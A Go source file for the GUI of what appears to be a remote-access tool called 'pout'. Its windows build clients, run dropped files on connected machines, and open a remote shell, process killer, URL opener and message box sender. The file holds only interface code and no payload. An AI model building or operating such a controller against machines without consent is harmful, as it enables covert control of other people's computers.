package render

import (
	"fmt"
	"image"
	"time"

	g "github.com/AllenDang/giu"

	"github.com/codeuk/pout/cmd/helper"
	"github.com/codeuk/pout/cmd/server"
	"github.com/codeuk/pout/cmd/system"
)

// Input storage variables.
var (
	ClientBuildConfig = helper.NewBuilderConfig()
	MessageBoxToSend  = server.MessageBox{Delay: 1, Amount: 1}
	FilesToSend       []server.ClientFile
	URLToOpen         string
	FilesUploadedStr  string
)

// `FileDropManager` is the dropper callback that handles any files dropped in the program appropriately.
func FileDropManager(filePaths []string) {
	// File Executor window.
	if ClientRunFileWindowOpen {
		for _, path := range filePaths {
			if content, err := system.GetFileContent(path); err == nil {
				FilesUploadedStr += fmt.Sprintf("%s\n", path)

				// Add this file to the list of files to run on the client.
				FilesToSend = append(FilesToSend, server.ClientFile{
					// Send the base of the filepath as opposed to the client being
					// able to view the full path that the file was uploaded from.
					// ex. "C:\Path\example file.exe" -> "examplefile.exe"
					Name:    system.BasePath(path),
					Content: content,
				})
			}
		}

		g.Update()
	}
}

// `RunGUI` displays the configured widgets in the GUI, while constantly updating.
func RunGUI() {
	var client *server.Client

	g.SingleWindowWithMenuBar().Layout(
		// Pout menu bar.
		g.MenuBar().Layout(
			g.Menu("Server").Layout(
				g.MenuItem("Start").OnClick(func() {
					// Start the server in a goroutine so the GUI can still update.
					go server.CurrentServer.Run("8080")
				}),
				g.MenuItem("Close").OnClick(func() {
					// Display the SERVER_CLOSE popup modal.
					system.ExitGracefully(func() {})
				}),
			),

			g.Menu("Client").Layout(
				g.MenuItem("Open Builder").OnClick(ToggleClientBuilderOpen),
			),
		),

		// How many bytes (formatted, ex. 1.5MB) the server has sent / recieved.
		g.Row(
			g.Label(fmt.Sprintf("Sent [%s]", helper.FormatBytes(server.CurrentServer.SentBytes))),
			g.Label(fmt.Sprintf("Recieved [%s]", helper.FormatBytes(server.CurrentServer.RecvBytes))),
		),

		// Create the horizontal `SplitLayout` design for the GUI (Server Manager & Connected Machines).
		g.SplitLayout(g.DirectionVertical, 300,
			// Use the ServerManagerLayout return as the Server Manager sections layout.
			ServerManagerLayout(),

			// Use the ConnectedMachinesLayout return as the Connected Machines sections layout.
			ConnectedMachinesLayout(),
		),
	)

	if ClientBuilderWindowOpen {
		// Use the client in the Client Builder window.
		g.Window("Client Builder").IsOpen(&ClientBuilderWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(443, 240).
			// Use the ClientBuilderLayout return as the window layout.
			Layout(
				ClientBuilderLayout(),
			)
	}

	if ClientRunFileWindowOpen {
		// Make sure windows don't conflict and manage the client.
		if client = ManageWindowConflict(ToggleRunFileOpen); client != nil {
			// Use the client in the File Executor window.
			g.Window(fmt.Sprintf("File Executor : %s", client.MetaData.IP)).IsOpen(&ClientRunFileWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(330, g.Auto).
				// Use the FileExecutorLayout return as the window layout.
				Layout(
					FileExecutorLayout(client),
				)
		}
	}

	if ClientShellWindowOpen {
		// Make sure windows don't conflict and manage the client.
		if client = ManageWindowConflict(ToggleClientShellOpen); client != nil {
			// Use the client in the Remote Shell window.
			g.Window(fmt.Sprintf("Remote Shell : %s", client.MetaData.IP)).
				IsOpen(&ClientShellWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(600, 250).
				// Use the RemoteShellLayout return as the window layout.
				Layout(
					RemoteShellLayout(client),
				)
		}
	}

	if ClientProcessWindowOpen {
		// Make sure windows don't conflict and manage the client.
		if client = ManageWindowConflict(ToggleClientProcessManagerOpen); client != nil {
			// Check if we have passed the process update time or if we're in the middle of killing a process.
			if time.Since(client.ProcessMonitor.LastUpdatedProcesses) >=
				(time.Millisecond*time.Duration(client.ProcessMonitor.ProcessUpdateTime)) && !client.ProcessMonitor.KillingProcess {
				// Update the process table.
				go client.GetProcesses()
			}

			// Use the client in the Process Manager window.
			g.Window(fmt.Sprintf("Process Manager : %s", client.MetaData.IP)).
				IsOpen(&ClientProcessWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(400, 300).
				// Use the ProcessManagerLayout return as the window layout.
				Layout(
					ProcessManagerLayout(client),
				)
		}
	}

	if ClientURLWindowOpen {
		// Make sure windows don't conflict and manage the client.
		if client = ManageWindowConflict(ToggleURLOpenerOpen); client != nil {
			// Use the client in the URL Opener window.
			g.Window(fmt.Sprintf("URL Opener : %s", client.MetaData.IP)).
				IsOpen(&ClientURLWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(250, g.Auto).
				// Use the URLOpenerLayout return as the window layout.
				Layout(
					URLOpenerLayout(client),
				)
		}
	}

	if ClientMsgBoxWindowOpen {
		// Make sure windows don't conflict and manage the client.
		if client = ManageWindowConflict(ToggleClientMsgBoxOpen); client != nil {
			// Use the client in the Message Box Sender window.
			g.Window(fmt.Sprintf("Message Box Sender : %s", client.MetaData.IP)).
				IsOpen(&ClientMsgBoxWindowOpen).Flags(g.WindowFlagsNone).Pos(0, 22).Size(465, 200).
				// Use the MessageBoxSenderLayout return as the window layout.
				Layout(
					MessageBoxSenderLayout(client),
				)
		}
	}
}

// `SetWindowIcon` loads the icon texture from the passed image path and applies it to the window.
func SetWindowIcon(window *g.MasterWindow, path string) {
	// Variables used for loading and setting the window icon.
	var (
		icon *image.RGBA
		tex  *g.Texture
		_    = tex // Make sure tex is used to stop IDE warnings.
	)

	// Load the icons RGBA data from the passed icon path.
	icon, _ = g.LoadImage(path)
	g.EnqueueNewTextureFromRgba(icon, func(t *g.Texture) {
		tex = t
	})

	// Set the programs Icon.
	window.SetIcon([]image.Image{icon})
}

// `Init` initialises the GUI window and runs it indefinitely.
func Init() {
	w := g.NewMasterWindow("POUT V0.1", 1050, 600, g.MasterWindowFlagsNotResizable)

	SetWindowIcon(w, system.AssetsPath+"icon.png")

	// Handle files being dropped into the program.
	w.SetDropCallback(FileDropManager)

	w.Run(RunGUI)
}
